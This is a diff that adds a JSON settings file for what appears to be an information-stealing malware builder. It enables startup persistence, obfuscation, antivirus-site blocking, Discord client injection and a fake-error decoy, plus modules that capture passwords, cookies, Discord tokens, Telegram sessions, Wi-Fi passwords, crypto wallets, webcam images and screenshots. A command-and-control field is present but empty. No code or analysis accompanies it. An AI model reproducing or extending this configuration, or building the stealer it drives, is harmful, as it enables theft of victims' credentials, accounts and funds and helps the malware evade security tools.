@@ -1,0 +1,31 @@
+{
+    "settings" : {
+        "c2" : [0, ""],
+        "pingme" : true,
+        "vmprotect" : true,
+        "startup" : true,
+        "melt" : false,
+        "archivePassword" : "blank",
+        "consoleMode" : 0,
+        "debug" : false
+    },
+    
+    "modules" : {
+        "captureWebcam" : true,
+        "capturePasswords" : true,
+        "captureCookies" : true,
+        "captureHistory" : true,
+        "captureDiscordTokens" : true,
+        "captureGames" : true,
+        "captureWifiPasswords" : true,
+        "captureSystemInfo" : true,
+        "captureScreenshot" : true,
+        "captureTelegramSession" : true,
+        "captureCommonFiles" : true,
+        "captureWallets" : true,
+
+        "fakeError" : [false, ["title", "message", 0]],
+        "blockAvSites" : true,
+        "discordInjection" : true
+    }
+}
